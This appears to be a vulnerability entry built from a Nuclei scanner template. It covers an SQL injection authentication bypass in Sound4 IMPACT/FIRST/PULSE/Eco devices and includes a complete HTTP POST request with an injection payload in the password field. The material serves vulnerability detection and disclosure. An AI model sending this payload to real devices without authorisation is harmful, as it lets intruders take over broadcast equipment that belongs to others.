# Nuclei Template: Sound4 IMPACT/FIRST/PULSE/Eco <=2.x - Authentication Bypass
**Template ID:** sound4-password-auth-bypass
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`sound4-impact-password-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
The application suffers from an SQL Injection vulnerability. Input passed through the 'password' POST parameter in 'index.php' is not properly sanitised before being returned to the user or used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code and bypass the authentication mechanism.

## Steps to reproduce / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=test&password=%27%2Bjoxy--%2Bz
```

## References
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5727.php
